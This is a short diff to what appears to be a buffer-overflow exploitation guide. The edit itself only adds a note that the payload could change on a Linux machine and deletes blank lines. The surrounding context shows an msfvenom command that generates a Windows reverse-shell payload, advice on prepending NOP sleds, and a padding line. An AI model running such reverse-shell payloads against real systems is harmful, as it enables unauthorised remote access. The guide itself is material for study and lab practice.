@@ -295,6 +295,8 @@ or
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0IP LPORT=NetcatPort EXITFUNC=thread -b "\x00\x0a\x0d" -f python
 ```
 
+NOTE: Could change if it's a Linux machine
+
 ### Prepend NOPs
 
 If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.
@@ -318,9 +320,6 @@ padding = "\x90" * 16
 ```
 
 # 6. Exploit it!
-
-
-
 
 
 
